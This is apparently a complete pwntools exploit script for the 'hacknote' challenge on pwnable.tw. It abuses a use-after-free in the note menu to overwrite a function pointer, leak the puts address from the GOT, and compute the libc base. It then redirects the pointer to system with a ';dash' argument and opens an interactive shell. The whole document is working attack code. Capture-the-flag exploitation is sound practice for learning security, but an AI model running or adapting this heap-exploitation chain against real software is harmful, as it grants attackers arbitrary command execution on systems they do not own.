from pwn import *

#context.log_level = 'debug'

s = remote("chall.pwnable.tw",10102)
e = ELF("./hacknote")
libc = ELF("libc_32.so.6")

print_content = 0x0804862B

def add(size,content):
	s.recvuntil("Your choice :")
	s.sendline("1")
	s.recvuntil("Note size :")
	s.sendline(str(size))
	s.recvuntil("Content :")
	s.sendline(content)
	s.recvuntil("Success !")

def del_note(index):
	s.recvuntil("Your choice :")
	s.sendline("2")
	s.recvuntil("Index :")
	s.sendline(str(index))
	s.recvuntil("Success")

def print_note(index):
	s.recvuntil("Your choice :")
	s.sendline("3")
	s.recvuntil("Index :")
	s.sendline(str(index))

add(20,"AAAA")
add(20,"BBBB")

del_note(0)
del_note(1)

add(8,p32(print_content) + p32(e.got['puts']))
print_note(0)

leak = u32(s.recv(4))
base = leak - libc.symbols['puts']
system = base + libc.symbols['system']
binsh = base + next(libc.search("/bin/sh"))

pay = p32(system)
pay += ";dash"

del_note(2)

add(12,pay)

s.interactive()
